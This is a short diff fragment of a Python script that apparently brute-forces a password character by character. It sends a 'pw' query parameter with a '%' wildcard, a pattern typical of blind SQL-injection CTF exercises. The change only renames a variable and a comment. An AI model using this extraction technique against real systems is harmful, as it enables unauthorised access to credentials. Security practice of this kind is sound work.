@@ -7,10 +7,10 @@ string_data = string.digits + string.ascii_letters
 
 print(string_data)
 
-password = ""
+pw = ""
 guest_pw = ""
 
-# find password length
+# find pw length
 while True:
     for i in string_data:
         data = "?pw={}%".format(guest_pw+i)
